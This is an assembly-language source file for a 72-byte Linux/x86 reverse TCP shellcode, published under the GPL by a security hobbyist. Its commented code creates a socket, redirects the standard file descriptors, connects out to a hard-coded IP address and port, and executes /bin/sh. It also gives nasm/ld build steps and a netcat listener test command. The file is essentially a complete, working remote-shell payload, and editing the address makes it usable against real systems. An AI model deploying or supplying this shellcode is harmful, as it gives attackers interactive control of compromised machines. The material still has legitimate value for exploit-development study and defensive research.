; Shell Reverse TCP Shellcode - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   shell_reverse_tcp
;
;   * 72 bytes
;   * null-bytes free if the address and port are
;
;
;   # nasm -f elf32 shell_reverse_tcp.asm -o shell_reverse_tcpl.o
;   # ld -m elf_i386 shell_reverse_tcp.o -o shell_reverse_tcp
;
;   Testing
;   # nc -l 127.1.1.1 55555
;   # ./shell_reverse_tcp


global _start

section .text

_start:

	; host
	push 0x0101017f		; IP Number "127.1.1.1" in hex reverse order
	pop esi

	; port
	push WORD 0x03d9	; Port Number 55555 in hex reverse order
	pop edi


        ; syscalls (/usr/include/asm/unistd_32.h)
        ; socketcall numbers (/usr/include/linux/net.h)

        ; Creating the socket file descriptor
        ; int socket(int domain, int type, int protocol);
        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	push 102
	pop eax			; syscall 102 - socketcall
	cdq

	push 1
	pop ebx			; socketcall type (sys_socket 1)

	push edx		; IPPROTO_IP = 0 (int)
	push ebx		; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

finalint:

	mov ecx, esp		; ptr to argument array
	int 0x80		; kernel interruption

	xchg ebx, eax		; set ebx with the sockfd


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2 (clientfd, ...)

	pop ecx

dup_loop:
        mov al, 63		; syscall 63 - dup2
        int 0x80

        dec ecx
        jns dup_loop


	; Connecting the duplicated file descriptor to the host
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; connect(sockfd, [AF_INET, 55555, 127.1.1.1], 16)

	mov al, 102		; syscall 102 - socketcall
				; socketcall type (sys_connect) 3 - ebx already has it

	; host address structure
	push esi		; IP number
	push di			; port in byte reverse order = 55555 (uint16_t)
	push WORD 2		; AF_INET = 2 (unsigned short int)
	mov ecx, esp		; struct pointer

	; connect arguments
	push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
	push ebx		; socket fd (int)

	mov ecx, esp

	int 0x80

        ; Finally, using execve to substitute the actual process with /bin/sh
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; exevcve("/bin/sh", NULL, NULL)

        mov al, 11		; execve syscall

	; execve string argument
        push edx		; null-byte
        push 0x68732f2f		; "//sh"
        push 0x6e69622f		; "/bin"

        mov ebx, esp		; ptr to ["bin//sh", NULL] string
        push edx		; null ptr to argv
        push ebx		; null ptr to envp

	jmp finalint		; and jump to bingo
